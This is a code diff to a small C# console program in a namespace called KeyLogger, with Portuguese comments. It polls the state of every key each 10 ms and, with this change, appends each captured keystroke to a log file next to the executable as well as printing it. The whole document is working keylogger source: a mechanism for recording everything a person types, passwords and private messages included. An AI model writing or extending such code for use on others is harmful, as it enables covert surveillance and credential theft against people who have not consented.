@@ -5,6 +5,8 @@
 
 using System;
 using System.Drawing;
+using System.IO;
+using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Windows.Forms;
@@ -33,6 +35,11 @@ namespace KeyLogger
         private static extern bool GetCursorPos(out Point lpPoint);
 
         /// <summary>
+        /// Nome do arquivo que armazena o log.
+        /// </summary>
+        private static string _filename = Assembly.GetExecutingAssembly().Location + ".log";
+        
+        /// <summary>
         /// Ponto de entrada da execução do programa.
         /// </summary>
         private static void Main()
@@ -42,7 +49,9 @@ namespace KeyLogger
                 foreach (var key in (Keys[])Enum.GetValues(typeof(Keys)))
                 {
                     if (GetAsyncKeyState(key) != -32767) continue;
-                    Console.Write(GetKeyName(key));
+                    var keyName = GetKeyName(key);
+                    File.AppendAllText(_filename, keyName);
+                    Console.Write(keyName);
                 }
             }, null, TimeSpan.Zero, TimeSpan.FromMilliseconds(10));
             
@@ -59,7 +68,7 @@ namespace KeyLogger
             switch (key)
             {
                 case Keys.Space: return " ";
-                case Keys.Enter: return "\n";
+                case Keys.Enter: return Environment.NewLine;
                 default:
                 {
                     var name = $"{Enum.GetName(typeof(Keys), key)}";
